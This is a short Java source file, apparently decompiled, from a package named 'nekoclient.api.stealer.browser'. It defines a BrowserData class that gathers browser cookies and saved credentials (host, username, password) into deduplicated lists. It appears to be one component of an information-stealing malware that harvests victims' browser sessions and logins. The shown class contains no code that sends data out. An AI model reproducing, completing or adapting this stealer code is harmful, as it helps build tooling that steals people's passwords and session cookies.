package dev.neko.nekoclient.api.stealer.browser;

import dev.neko.nekoclient.api.stealer.browser.cookie.Cookie;
import dev.neko.nekoclient.api.stealer.browser.impl.credential.Credential;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class BrowserData {
   private final List<Cookie> cookies = new ArrayList<>();
   private final List<Credential> credentials = new ArrayList<>();

   public void addCookie(Cookie cookie) {
      if (!this.cookies.contains(cookie)) {
         this.cookies.add(cookie);
      }
   }

   public void addCredential(Credential credential) {
      if (!Objects.isNull(credential.getHost())
         && !Objects.isNull(credential.getUsername())
         && !credential.getUsername().isEmpty()
         && !Objects.isNull(credential.getPassword())
         && !credential.getPassword().isEmpty()
         && !this.credentials.contains(credential)) {
         this.credentials.add(credential);
      }
   }

   public final List<Cookie> getCookies() {
      return this.cookies;
   }

   public final List<Credential> getCredentials() {
      return this.credentials;
   }
}
